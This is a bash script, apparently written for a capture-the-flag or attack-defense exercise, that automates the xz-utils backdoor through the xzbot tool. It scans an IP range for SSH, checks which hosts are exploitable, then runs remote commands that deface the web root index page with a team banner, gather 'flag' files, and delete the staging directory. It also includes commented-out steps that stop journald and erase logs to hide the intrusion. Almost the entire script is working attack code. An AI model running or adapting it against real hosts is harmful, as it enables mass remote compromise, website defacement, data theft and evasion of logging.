#!/bin/bash

echo "================================"
echo "xzbot exploit automation"
echo "================================"

echo "$(date)"

ip_pattern="^([0-9]{1,3}(\-[0-9]{1,3})?\.){3}[0-9]{1,3}(\-[0-9]{1,3})?$"

# Add multi IP address in the near future...
# Check argument
if [[ ${#} -eq 0 ]]; then
	echo "-------------------------------"
	echo "[-] No IP address given"
	echo "[?] Command format: ${0} {IP_ADDRESS}"
	echo "[?] IP_ADDRESS could be range(ex. 127.0.0-10.1-100)"
	echo "-------------------------------"
	echo "[-] Terminate program"
	exit 1
elif [[ ! ${1} =~ ${ip_pattern} ]]; then
	echo "-------------------------------"
	echo "[-] Invalid IP format"
	echo "[?] Single IP format could be 127.0.0.1"
	echo "[?] Ranged IP format could be 127.0.0-10.1-100"
	echo "-------------------------------"
	echo "[-] Terminate program"
	exit 1
fi

# Nmap Port Scanner -> Custom Port Scanner
echo "--------------------------------"
echo "[+] SSH scanning"
ip_str=$(nmap -Pn -p22 -open ${1} -n -oG - | awk '/Up$/{print $2}')
ip_array=(${ip_str})
ip_count=${#ip_array[@]}
echo "[+] SSH scan complete"
echo "[+] IP list"
for index in $(seq 1 ${ip_count})
do
	echo "${index}. ${ip_array[${index}-1]}"
done

echo "--------------------------------"

c2_ip="$(curl -s ifconfig.me)"

domain_path="/var/www/html/index.html"
delete_domain="rm ${domain_path}"
change_domain=(
	"<!DOCTYPE html>"
	"<html>"
	"\t<body>"
	"\t\t<h1>Team\c"
	"LeeSuKy</h1>"
	"\t\t<p>xz-utils\c"
	"backdoor exploit</p>"
	"\t\t<img src=\c"
	"https://xzbot.s3.\c"
	"ap-northeast-2.\c"
	"amazonaws.com\c"
	"/Pepe.gif>"
	"\t</body>"
	"</html>"
)

root_path="/home/admin"
target_path="${root_path}/exploit"
make_dir="mkdir ${target_path}"

copy_flag="find ${root_path} -name \"flag\" -exec cp {} ${target_path} \;"
key_path="${root_path}/.ssh/id_rsa"

gen_key="ssh-keygen -t rsa -f ${key_path} -N \"\" <<< y"
exploit_id="victim"
exploit_pw="exploit"
destination_path="/home/victim"
send_data="clear" # Incomplete

delete_file="rm -rf ${target_path}"
stop_logging="systemctl stop systemd-journald"
delete_log="clear" # Incomplete
start_logging="systemctl start systemd-journald"

for index in $(seq 1 ${ip_count})
do
	echo "${index}. ${ip_array[${index}-1]}:22"
	xzbot="xzbot -addr ${ip_array[${index}-1]}:22 -cmd"
	
	echo "[+] Health check start"
	xzbot_check="$(${xzbot} "" 2>&1 > /dev/null | wc -c)"
	if [ "${xzbot_check}" == 47 ]; then
		echo "[+] ${ip_array[${index}-1]}:22 is exploitable"
	else
		echo "[-] Health check failed"
		echo "--------------------------------"
		continue
	fi

	# Add all function's success or failure
	
	# echo "[+] Stop logging"
	# ${xzbot} "${stop_logging}" > /dev/null 2>&1

	echo "[+] Exploit domain contents"
	${xzbot} "${delete_domain}" > /dev/null 2>&1
	for cd_index in $(seq 0 $((${#change_domain[@]}-1)))
	do
		${xzbot} "echo \"${change_domain[${cd_index}]}\" >> ${domain_path}" > /dev/null 2>&1
	done

	echo "[+] Make directory"
	${xzbot} "${make_dir}" > /dev/null 2>&1
	
	echo "[+] Copy flag files"
	${xzbot} "${copy_flag}" > /dev/null 2>&1
	
	echo "[+] Sending data"
	${xzbot} "${send_data}" > /dev/null 2>&1
	
	echo "[+] Delete files"
	${xzbot} "${delete_file}" > /dev/null 2>&1
	
	# echo "[+] Delete logs"
	# ${xzbot} "$delete_log}" > /dev/null 2>&1

	# echo "[+] Start logging"
	# ${xzbot} "${start_logging}" > /dev/null 2>&1

	echo "[+] Tasks done"
	echo "--------------------------------"
done

echo "[+] Tasks finished"